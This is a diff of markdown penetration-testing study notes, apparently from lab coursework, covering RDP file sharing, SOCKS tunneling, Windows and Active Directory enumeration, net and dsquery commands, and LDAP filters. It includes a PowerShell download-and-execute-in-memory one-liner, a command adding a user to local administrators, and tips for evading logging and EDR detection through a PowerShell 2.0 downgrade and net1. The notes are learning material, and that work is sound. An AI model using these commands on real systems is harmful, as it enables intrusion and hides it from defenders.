@@ -1078,11 +1078,12 @@ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
 xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
 ```
 
-To access the shared folder from within the RDP session, connect to `\\tsclient\` in File Explorer (Network tab):
+To access the directory, we can connect to `\\tsclient\`, allowing us to transfer file to and from the RDP session. You can use the Network tab in the explorer file.
 
 ![Pasted image 20260623191726](images/Pasted%20image%2020260623191726.png)
 
-Alternative using `mstsc.exe`: Local Resources > Local devices and resources > More > Drives:
+An alternative for Windows is use mstsc.exe remote desktop client.
+Local Resources > Local devices and resources, more > Drives
 
 ![Pasted image 20260623191829](images/Pasted%20image%2020260623191829.png)
 
@@ -1710,9 +1711,11 @@ xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
 plink -ssh -D 9050 ubuntu@10.129.15.50
 ```
 
-Configure [Proxifier](https://www.proxifier.com) with a SOCKS proxy at `127.0.0.1:9050` to route traffic through the tunnel, then launch `mstsc.exe` directly:
+We have [Proxifier](https://www.proxifier.com) tool to create a tunneled network through SOCKS or HTTPS proxy.
 
 ![Pasted image 20260716190120](images/Pasted%20image%2020260716190120.png)
+
+You can configure the SOCKS server with 127.0.0.1 and port 9050. Then, you can directly start`mstsc.exe` to start an RDP session with a Windows target that allows RDP connections.
 
 ### Rpivot
 ```bash
@@ -3373,42 +3376,61 @@ Common patterns: `$desktop%@admin123` (workstations), `$server%@admin123` (serve
 
 ## Living Off the Land
 
+Basic commands
+
 ### Windows Enumeration Commands
 
-| Command | Description |
-| :--- | :--- |
-| `hostname` | Prints the PC's name |
-| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
-| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
-| `ipconfig /all` | Prints out network adapter state and configurations |
-| `set` | Displays a list of environment variables for the current session (from CMD) |
-| `echo %USERDOMAIN%` | Displays the domain name to which the host belongs (from CMD) |
-| `echo %logonserver%` | Prints out the name of the Domain Controller the host checks in with (from CMD) |
+| Command                                                 | Description                                                                                |
+| :------------------------------------------------------ | :----------------------------------------------------------------------------------------- |
+| `hostname`                                              | Prints the PC's name                                                                       |
+| `[System.Environment]::OSVersion.Version`               | Prints out the OS version and revision level                                               |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host                                        |
+| `ipconfig /all`                                         | Prints out network adapter state and configurations                                        |
+| `set`                                                   | Displays a list of environment variables for the current session (ran from CMD-prompt)     |
+| `echo %USERDOMAIN%`                                     | Displays the domain name to which the host belongs (ran from CMD-prompt)                   |
+| `echo %logonserver%`                                    | Prints out the name of the Domain Controller the host checks in with (ran from CMD-prompt) |
 
-Running `systeminfo` combined with the above gives an initial picture of the host state with fewer log entries.
+You can use `systeminfo` command with the above commands to obtain a initial picture of the state in the host. Running one command will generate fewer logs, meaning less of chance we are noticed on the host.
+
+We can use built-in function in powershell to obtain more information
 
 ### PowerShell Enumeration & Execution Commands
 
 | Cmdlet / Command | Description |
 | :--- | :--- |
-| `Get-Module` | Lists available modules loaded for use |
-| `Get-ExecutionPolicy -List` | Prints the execution policy settings for each scope |
-| `Set-ExecutionPolicy Bypass -Scope Process` | Changes the policy for the current process only (reverts on exit) |
-| `Get-ChildItem Env: \| ft Key,Value` | Returns environment values such as key paths, users, computer info |
-| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Gets the specified user's PowerShell history (may contain passwords) |
-| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <follow-on commands>"` | Quick way to download a file from the web and call it from memory |
+| `Get-Module` | Lists available modules loaded for use. |
+| `Get-ExecutionPolicy -List` | Will print the execution policy settings for each scope on a host. |
+| `Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host. |
+| `Get-ChildItem Env: \| ft Key,Value` | Return environment values such as key paths, users, computer information, etc. |
+| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords. |
+| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` | This is a quick and easy way to download a file from the web using PowerShell and call it from memory. |
 
 #### Downgrade PowerShell
 
-PowerShell event logging was introduced in version 3.0. Calling version 2.0 bypasses script block logging in the event viewer.
+Many defenders are unware that several version of PowerShell often exist in a host. if not uninstalled, they can still be used. PowerShell event logging was introduced as a feature in 3.0 and forward.
 
+We can attempt to call PowerShell 2.0 or older, and script block logging and commands will not be logged in the event viewer.
+
+Check the version with:
 ```powershell
-Get-host                   # check current version
-powershell.exe -version 2  # downgrade (the downgrade command itself will be logged)
-Get-host                   # confirm version 2
+Get-host
 ```
 
-### Checking Defenses
+Downgrade:
+```powershell
+powershell.exe -version 2
+```
+
+You can check the version again:
+```powershell
+Get-host
+```
+
+You have to be aware that the command `powershell.exe -version 2` within the PowerShell will be logged.
+
+### Checking defenses
+
+We can use netsh and sc to get a feel for the state of the host when it comes to Windows Firewall and to check the status of Windows Defender
 
 #### Firewall checks
 
@@ -3418,78 +3440,126 @@ netsh advfirewall show allprofiles
 
 #### Windows Defender Check
 
+Check if it is running
 ```
 sc query windefend
+```
+
+Check the status and configuration settings
+
+```
 Get-MpComputerStatus
 ```
 
-### Check if You Are Alone
+### Check if you are alone
 
+When you land in a host for the first time, it is important to check if there are someone more connected. If you start doing things, there is the potential for them to notice you.
+
+For this you can use
 ```powershell
 qwinsta
 ```
 
+### Network Settings
+
 ### Network & Firewall Enumeration Commands
 
-| Command | Description |
-| :--- | :--- |
-| `arp -a` | Lists all known hosts stored in the ARP table |
-| `ipconfig /all` | Prints out adapter settings for the host |
-| `route print` | Displays the routing table (IPv4 & IPv6) |
-| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall |
+| Command                              | Description                                                                                                      |
+| :----------------------------------- | :--------------------------------------------------------------------------------------------------------------- |
+| `arp -a`                             | Lists all known hosts stored in the ARP table.                                                                   |
+| `ipconfig /all`                      | Prints out adapter settings for the host. We can figure out the network segment from here.                       |
+| `route print`                        | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host. |
+| `netsh advfirewall show allprofiles` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.              |
 
 ### Windows Management Instrumentation (WMI)
 
-#### WMIC Enumeration Commands
+Is a script engine widely used within Windows enterprise environment to retrieve information and run administrative tasks.
+
+### WMIC Enumeration Commands
 
 | Command | Description |
 | :--- | :--- |
-| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of Hotfixes applied |
-| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information |
+| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patch level and description of the Hotfixes applied |
+| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Displays basic host information to include any attributes within the list |
 | `wmic process list /format:list` | A listing of all processes on host |
 | `wmic ntdomain list /format:list` | Displays information about the Domain and Domain Controllers |
-| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts |
+| `wmic useraccount list /format:list` | Displays information about all local accounts and any domain accounts that have logged into the device |
 | `wmic group list /format:list` | Information about all local groups |
-| `wmic sysaccount list /format:list` | Dumps information about system accounts used as service accounts |
+| `wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts |
 
-Domain, child domain, and external forest trust info:
+Obtain information about the domain, child domain and the external forest that our current domain has a trust with.
+
 ```powershell
 wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
 ```
 
+Useful cheatsheet for wmic: https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
+
 ### Net Commands
 
-> `net.exe` commands are typically monitored by EDR solutions. Use `net1` as an alternative to avoid triggering signature-based detection.
+We can use net commands to enumerate information from the domain such as:
 
-#### Net Commands Enumeration & Management
+Keep in mind that `net.exe` commands are typically monitored by EDR solutions. Some organizations will even configure their monitoring tool to throws alerts if certain commands are run by users in specific OUs, such as a Marketing associate's account running commands such as `whoami` or `net localgroup administrators`. This is a potential red flags.
 
-| Command | Description |
-| :--- | :--- |
-| `net accounts` | Information about password requirements |
-| `net accounts /domain` | Password and lockout policy |
-| `net group /domain` | Information about domain groups |
-| `net group "Domain Admins" /domain` | List users with domain admin privileges |
-| `net group "domain computers" /domain` | List of PCs connected to the domain |
-| `net group "Domain Controllers" /domain` | List PC accounts of domain controllers |
-| `net group <domain_group_name> /domain` | Users that belong to the specified group |
-| `net groups /domain` | List of domain groups |
-| `net localgroup` | All available local groups |
-| `net localgroup administrators /domain` | List users in the administrators group (includes Domain Admins) |
-| `net localgroup Administrators` | Information about a local group (admins) |
-| `net localgroup administrators [username] /add` | Add user to local administrators group |
-| `net share` | Check current shares |
-| `net user <ACCOUNT_NAME> /domain` | Get information about a user within the domain |
-| `net user /domain` | List all users of the domain |
-| `net user %username%` | Information about the current user |
-| `net use x: \\computer\share` | Mount the share locally |
-| `net view` | Get a list of computers |
-| `net view /all /domain[:domainname]` | Shares on the domains |
-| `net view \\computer /ALL` | List shares of a computer |
-| `net view /domain` | List of PCs of the domain |
+- Local and domain users
+- Groups
+- Hosts
+- Specific users in groups
+- Domain Controllers
+- Password requirements
+
+### Net Commands Enumeration & Management
+
+Remember that you can use `net1`.
+
+| Command                                         | Description                                                                                                                |
+| :---------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------- |
+| `net accounts`                                  | Information about password requirements                                                                                    |
+| `net accounts /domain`                          | Password and lockout policy                                                                                                |
+| `net group /domain`                             | Information about domain groups                                                                                            |
+| `net group "Domain Admins" /domain`             | List users with domain admin privileges                                                                                    |
+| `net group "domain computers" /domain`          | List of PCs connected to the domain                                                                                        |
+| `net group "Domain Controllers" /domain`        | List PC accounts of domain controllers                                                                                     |
+| `net group <domain_group_name> /domain`         | Users that belong to the specified group                                                                                   |
+| `net groups /domain`                            | List of domain groups                                                                                                      |
+| `net localgroup`                                | All available local groups                                                                                                 |
+| `net localgroup administrators /domain`         | List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default) |
+| `net localgroup Administrators`                 | Information about a local group (admins)                                                                                   |
+| `net localgroup administrators [username] /add` | Add user to local administrators group                                                                                     |
+| `net share`                                     | Check current shares                                                                                                       |
+| `net user <ACCOUNT_NAME> /domain`               | Get information about a user within the domain                                                                             |
+| `net user /domain`                              | List all users of the domain                                                                                               |
+| `net user %username%`                           | Information about the current user                                                                                         |
+| `net use x: \\computer\share`                   | Mount the share locally                                                                                                    |
+| `net view`                                      | Get a list of computers                                                                                                    |
+| `net view /all /domain[:domainname]`            | Shares on the domains                                                                                                      |
+| `net view \\computer /ALL`                      | List shares of a computer                                                                                                  |
+| `net view /domain`                              | List of PCs of the domain                                                                                                  |
+
+Listing domain groups
+
+```
+net group /domain
+```
+
+Obtain information about a domain user
+
+```
+net user /domain wrouse
+```
+
+#### Net commands tricks to avoid network defenders
+
+If you believe that network defender are actively looking you can use **net1** instead of `net` command. This will be execute the same functions
 
 ### Dsquery
 
-Active Directory object search tool. Available only on hosts with the AD DS Role (typically DCs). Requires elevated privileges (SYSTEM context).
+This command-line tool is used to find Active Directory objects.
+The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView.
+
+It is possible that we don't have this tool, only hosts with Active Directory Domain Services Role (normally DC) have it.
+
+To use it we need to elevated privileges to run a instance of powershell or cmd with `SYSTEM`.
 
 #### User Search
 
@@ -3505,17 +3575,21 @@ dsquery computer
 
 #### Wildcard Search
 
+We can use wildcard search to view all objects in an OU, for example:
+
 ```powershell
 dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
 ```
 
 #### Users With Specific Attributes Set (PASSWD_NOTREQD)
 
+We can combine `dsquery` with LDAP search filters. For example, looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.
+
 ```powershell
 dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
 ```
 
-#### Searching for Domain Controllers
+#### Searching for domain controller
 
 ```powershell
 dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
@@ -3523,36 +3597,58 @@ dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -
 
 ### LDAP Filtering Explained
 
-`userAccountControl:1.2.840.113556.1.4.803:=8192` — searches the UAC attribute for a specific bit value (`8192` = Domain Controller).
+`userAccountControl:1.2.840.113556.1.4.803:=8192` This string looking at the User Account Control (UAC) attributes.
 
-**OID match rules:**
-1. `1.2.840.113556.1.4.803` — bit value must match completely (exact match)
-2. `1.2.840.113556.1.4.804` — any bit in the chain matches (OR-style)
-3. `1.2.840.113556.1.4.1941` — searches through ownership and membership entries (nested groups)
-
-**Logical operators:** `&` (AND), `|` (OR), `!` (NOT)
+`=8192` Represents the decimal bitmask we want to match in this search. This decimal number correspond to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set
 
 ```
-# Users where password can't change (UAC bit 64)
-(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
+User Account Control Bit Values
 
-# Users where password CAN change (NOT bit 64)
-(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
+                                    1   2   32  64  128 512 2048 4096 8192 65536 524288 1048576
+                                    |   |   |   |   |   |   |    |    |    |     |      |
+  Login Script Will Execute --------+   |   |   |   |   |   |    |    |    |     |      |
+        Account Is Disabled ------------+   |   |   |   |   |    |    |    |     |      |
+      Password Not Required ----------------+   |   |   |   |    |    |    |     |      |
+      Password Can't Change --------------------+   |   |   |    |    |    |     |      |
+             Encrypted Text ------------------------+   |   |    |    |    |     |      |
+           Password Allowed                             |   |    |    |    |     |      |
+        Normal User Account ----------------------------+   |    |    |    |     |      |
+  Interdomain Trust Account --------------------------------+    |    |    |     |      |
+         Domain Workstation -------------------------------------+    |    |     |      |
+           or Member Server                                           |    |     |      |
+          Domain Controller ------------------------------------------+    |     |      |
+    Password Does Not Expire ----------------------------------------------+     |      |
+   Trusted For Impersonation ----------------------------------------------------+      |
+             Account May Not -----------------------------------------------------------+
+             Be Impersonated
 ```
 
-**UAC bit reference:**
+#### OID match string
 
-```
-1    Login Script Will Execute
-2    Account Is Disabled
-32   Password Not Required
-64   Password Can't Change
-128  Encrypted Text Password Allowed
-512  Normal User Account
-2048 Interdomain Trust Account
-4096 Domain Workstation or Member Server
-8192 Domain Controller
-65536 Password Does Not Expire
-524288 Trusted For Impersonation
-1048576 Account May Not Be Impersonated
-```
+For LDAP and AD there are three main matching rules.
+
+We are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+
+1. `1.2.840.113556.1.4.803`
+
+We want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+
+2. `1.2.840.113556.1.4.804`
+
+To match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries. For example if a user belongs to a group and that group belongs to another group (nested groups)...
+
+3. `1.2.840.113556.1.4.1941`
+
+#### Logical Operators
+
+When building out search strings, we can utilize logical operators for combine values. The operators `&`, `|` and `!` are used for this purpose.
+
+The first criteria indicate thta the object must be a user and combines it with searching for UAC bit value of 64 (Password can't change)
+
+`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
+
+You can use multiples attributes like `(&(1) (2) (3))`
+
+Search for any user object that does not have the password can't change attribute set.
+
+`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`
